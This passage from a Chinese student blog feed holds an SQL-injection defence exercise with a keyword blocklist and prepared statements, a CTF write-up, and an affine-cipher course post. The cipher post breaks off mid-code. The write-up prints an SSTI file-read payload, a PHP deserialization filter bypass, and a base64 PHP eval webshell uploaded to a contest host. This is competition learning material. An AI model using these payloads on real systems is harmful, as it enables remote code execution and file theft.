<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span>
<span class="hljs-comment">// echo "&lt;/div&gt;";</span>
$mysqli-&gt;close();
$result-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre></div>



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><p>对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。</p>
<p>代码实现</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$pwd=$_POST[<span class="hljs-string">'password'</span>];
$uname=$_POST[<span class="hljs-string">'username'</span>];
<span class="hljs-comment">//echo "select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;";</span>
<span class="hljs-comment">//echo "&lt;hr&gt;";</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span><span class="hljs-params">($Sql_Str)</span> </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
   $check=preg_match(<span class="hljs-string">'/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i'</span>,$Sql_Str);
    <span class="hljs-keyword">if</span> ($check) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;'</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> $Sql_Str;
    &#125;
&#125;
$pwd=inject_check($pwd);
$uname = inject_check($uname);
$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
$result = $mysqli-&gt;query(<span class="hljs-string">"select * from users where username='$uname' and password='$pwd'"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;

<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo "It is too long.";</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// else </span>
<span class="hljs-keyword">if</span>($row=mysqli_fetch_row($result))
&#123;
	printf (<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$row[<span class="hljs-number">1</span>],$row[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"login success."</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;
&#125;
<span class="hljs-comment">// echo "&lt;/TABLE&gt;";</span>
<span class="hljs-comment">// echo "&lt;/div&gt;";</span>
$mysqli-&gt;close();
$result-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span><span class="hljs-params">($Sql_Str)</span> </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
    $check=preg_match(<span class="hljs-string">'/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i'</span>,$Sql_Str);
    <span class="hljs-keyword">if</span> ($check) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;'</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> $Sql_Str;
    &#125;
&#125;</code></pre></div>



<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h4><p>使用预编译语句</p>
<p>代码如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$pwd=$_POST[<span class="hljs-string">'password'</span>];
$uname=$_POST[<span class="hljs-string">'username'</span>];

<span class="hljs-comment">// function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。</span>
<span class="hljs-comment">//     $check=preg_match('/select|from|where|if|database|order|insert|update|or|group_concat|\'|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i',$Sql_Str);</span>
<span class="hljs-comment">//     if ($check) &#123;</span>
<span class="hljs-comment">//         echo '&lt;script language="JavaScript"&gt;alert("hacker");&lt;/script&gt;';</span>
<span class="hljs-comment">//         exit();</span>
<span class="hljs-comment">//     &#125;else&#123;</span>
<span class="hljs-comment">//         return $Sql_Str;</span>
<span class="hljs-comment">//     &#125;</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-comment">// $pwd=inject_check($pwd);</span>
<span class="hljs-comment">// $uname = inject_check($uname);</span>
<span class="hljs-comment">// </span>

$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">'localhost'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>,<span class="hljs-string">'test'</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">"fail:%s&lt;br&gt;"</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;

<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;TABLE border=1,width=400&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;"</span>;
$result =  $mysqli-&gt;prepare(<span class="hljs-string">"select * from users where username=? and password=?"</span>);

$result-&gt;bind_param(<span class="hljs-string">'ss'</span>,$uname,$pwd);
$result-&gt;execute();
$result-&gt;store_result();
$result-&gt;bind_result($id,$un,$pd); <span class="hljs-comment">//将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。</span>
<span class="hljs-keyword">if</span>($result-&gt;fetch())
&#123;
	printf(<span class="hljs-string">"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</span>,$un,$pd);
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error."</span>;
&#125;



<span class="hljs-comment">// if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15)</span>
<span class="hljs-comment">// &#123;</span>
<span class="hljs-comment">// 	echo "It is too long.";</span>
<span class="hljs-comment">// &#125;</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/TABLE&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/div&gt;"</span>;
$result-&gt;close();
$mysqli-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>cumt华为杯</title>
    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
<p>就是了模板注入</p>
<div class="hljs"><pre><code class="hljs angelscript">url+&#123;&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;&#125;Copy</code></pre></div>

<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
<div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
查看模块时，发现存在waf
经过测试发现是过滤了[]
于是使用
&#123;&#123;<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
存在file模块
用read读取文件内容
<span class="hljs-built_in">exp</span>:
<span class="hljs-string">''</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">'/flag'</span>).read()Copy</code></pre></div>

<p>参考链接：<a href="https://xz.aliyun.com/t/8029" target="_blank" rel="noopener">https://xz.aliyun.com/t/8029</a></p>
<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></a></p>
<p>这里给出大神的做法</p>
<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></a></p>
<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
<p>看到WP是大S绕过，涨知识了</p>
<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
<span class="php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;</span>
<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span> </span>&#123;</span>
<span class="php">        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">'license.txt'</span>, <span class="hljs-keyword">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-keyword">true</span>);</span>
<span class="php">    &#125;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span><span class="hljs-params">($str)</span> </span>&#123;</span>
<span class="php">    <span class="hljs-comment">//echo $str;</span></span>
<span class="php">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $str, $matches)) &#123;</span>
<span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span>
<span class="php">    &#125;</span>
<span class="php">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))&#123;</span>
<span class="php">    $s = <span class="hljs-keyword">new</span> Source();</span>
<span class="php">    $s-&gt;source = <span class="hljs-keyword">__FILE__</span>;</span>

<span class="php">    <span class="hljs-keyword">echo</span> $s;</span>
<span class="php">    <span class="hljs-keyword">exit</span>;</span>
<span class="php">&#125;</span>
<span class="php">$todos = [];</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'todos'</span>]))&#123;</span>
<span class="php">    <span class="hljs-keyword">if</span>(!easy_check($_COOKIE[<span class="hljs-string">'todos'</span>])) &#123;</span>
<span class="php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!\n"</span>;</span>
<span class="php">    &#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="php">        $c = $_COOKIE[<span class="hljs-string">'todos'</span>];</span>
<span class="php">        $h = substr($c, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span>
<span class="php">        $m = substr($c, <span class="hljs-number">32</span>);</span>
<span class="php">        <span class="hljs-keyword">if</span>(md5($m) === $h)&#123;</span>
<span class="php">            $todos = unserialize($m);</span>
<span class="php">        &#125;</span>
<span class="php">    &#125;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'text'</span>]))&#123;</span>
<span class="php">    $todo = $_POST[<span class="hljs-string">'text'</span>];</span>

<span class="php">    $todos[] = $todo;</span>
<span class="php">    $m = serialize($todos);</span>
<span class="php">    $h = md5($m);</span>

<span class="php">    setcookie(<span class="hljs-string">'todos'</span>, $h.$m);</span>
<span class="php">    header(<span class="hljs-string">'Location: '</span>.$_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);</span>
<span class="php">    <span class="hljs-keyword">exit</span>;</span>
<span class="php">&#125;</span>
<span class="php"><span class="hljs-comment">// flag is in flag.php</span></span>
<span class="php">?Copy</span></code></pre></div>

<p>exp</p>
<div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">md5</span>('<span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:
&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');
<span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">urlencode</span>('<span class="hljs-attribute">ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');<span class="hljs-selector-tag">Copy</span></code></pre></div>

<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p>
<p>参考</p>
<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183" target="_blank" rel="noopener">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
<p>漏洞点在图片中上传图片的位置</p>
<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></a></p>
<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></a></p>
<blockquote>
<p>1.filetype规定了文件的类型</p>
<p>2.上传时，将图片保存为了base64形式</p>
<p>所以上传一句话木马的时候要注意修改对应的位置</p>
</blockquote>
<p>一句话木马类型为php,则filetype改为php</p>
<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></a></p>
<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
<div class="hljs"><pre><code class="hljs dockerfile">POST:
<span class="hljs-keyword">cmd</span><span class="bash">=system(<span class="hljs-string">"cat /flag"</span>);</span>
或者蚁剑连接，密码cmdCopy</code></pre></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
<p>直接在文件里搜索就能到flag</p>
<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
        <tag>ssti</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学</title>
    <url>/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<p>密码学实验课程设计</p>
<a id="more"></a>

<h1 id="一、古典密码"><a href="#一、古典密码" class="headerlink" title="一、古典密码"></a>一、古典密码</h1><h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换</p>
<h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文</p>
<p>加密函数：Y=（AX+B）%26</p>
<p>解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26</p>
<p>原理很简单，代码实现也比较简单</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>各个函数作用</p>
<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span></span>  求<span class="hljs-selector-tag">a</span>,b的最大公因子
<span class="hljs-function"><span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span></span>  计算a模m的逆元
<span class="hljs-function"><span class="hljs-title">encode</span><span class="hljs-params">(a,b,s)</span></span>       仿射加密
<span class="hljs-function"><span class="hljs-title">decode</span><span class="hljs-params">(a,b,s)</span></span>		仿射解密</code></pre></div>

<p>利用扩展的欧几里得算法求逆元</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span>:</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span>:</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m</code></pre></div>

<p>完整代码如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span>:</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span>:</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(a,b,s)</span>:</span>
    result = <span class="hljs-string">""</span>          <span class="hljs-comment"># 保存加密结果</span>
    s = s.upper()		 <span class="hljs-comment"># 全部转换为大写，方便计算</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(s)):
        s2 = chr((a*(ord(s[i])<span class="hljs-number">-65</span>)+b)%<span class="hljs-number">26</span> + <span class="hljs-number">65</span>)  <span class="hljs-comment">#使用加密公式 Y=（AX+B）%26</span>
        result = result +s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(a,b,s)</span>:</span>
    a1 = findModReverse(a,<span class="hljs-number">26</span>)
    result = <span class="hljs-string">""</span>
    s = s.upper()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):
        s2 = chr((a1 * (ord(s[i]) - <span class="hljs-number">65</span> - b)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>) <span class="hljs-comment"># 使用解密公式X=（A的逆元）*（Y-B）%26</span>
        result = result + s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s_decode</span><span class="hljs-params">(a,b,s)</span>:</span>
    letter =<span class="hljs-string">'abcdefghijklmnopqrstuvwxyz'</span>
    letter = letter.upper()
    s = s.upper()
    result = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(letter)):
            <span class="hljs-keyword">if</span> i == letter[(a*j+b)%<span class="hljs-number">26</span>]:
                result = result+letter[j]
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>										<span class="hljs-comment"># 主函数入口</span>
    answer = input(<span class="hljs-string">f'请输入所需的操作：编码/E or 解码/D: '</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">'E'</span>:
            a = int(input(<span class="hljs-string">'请输入a:'</span>))
            b = int(input(<span class="hljs-string">'请输入b:'</span>))
            s = input(<span class="hljs-string">'请输入需要加密的字符:'</span>)
            encode(a, b, s)
        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">'D'</span>:
            a = int(input(<span class="hljs-string">'请输入a:'</span>))
            b = int(input(<span class="hljs-string">'请输入b:'</span>))
            s = input(<span class="hljs-string">'请输入需要解密的字符：'</span>)
            decode(a, b, s)  <span class="hljs-comment"># 利用逆元解密</span>
            <span class="hljs-comment"># s_decode(a,b,s)   # 暴力枚举每一个字符</span>
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">'输入错误！'</span>)
    <span class="hljs-keyword">except</span> KeyError:
        print(<span class="hljs-string">'请勿输入空格！'</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()
<span class="hljs-comment"># a = 7, b = 22</span>
<span class="hljs-comment"># plain = firstthesentenceandthentheevidencesaidthequeen</span>
<span class="hljs-comment"># crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj</span></code></pre></div>

<p>加解密结果如图所示</p>
<p><img src="https://i.loli.net/2020/12/23/CqbfOdNB3mxHDt4.png" srcset="/img/loading.gif" alt="image-20201223225306141"></p>
<p><img src="https://i.loli.net/2020/12/23/CZHiL8cDjlUdvSw.png" srcset="/img/loading.gif" alt="image-20201223225317161"></p>
<h3 id="破解仿射密码"><a href="#破解仿射密码" class="headerlink" title="破解仿射密码"></a>破解仿射密码</h3><p>这里使用了加解密中的 <code>gcd</code> <code>findModReverse</code>，找出26以内且与26互素的所有数的逆元，并存放在一个列表中</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all</code></pre></div>

<p>完整代码如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span>:</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span>:</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(s)</span>:</span>
    re_all = findAllre()
    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> re_all:
        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):
            result = <span class="hljs-string">""</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s)):
                s2 = chr(((int(k1) * (ord(s[i]) - <span class="hljs-number">97</span> - k2)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>))
                result = result + s2
            print(<span class="hljs-string">"k1="</span> + str(findModReverse(k1,<span class="hljs-number">26</span>)) + <span class="hljs-string">", k2="</span> + str(k2) + <span class="hljs-string">" plaintext = "</span> + result)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
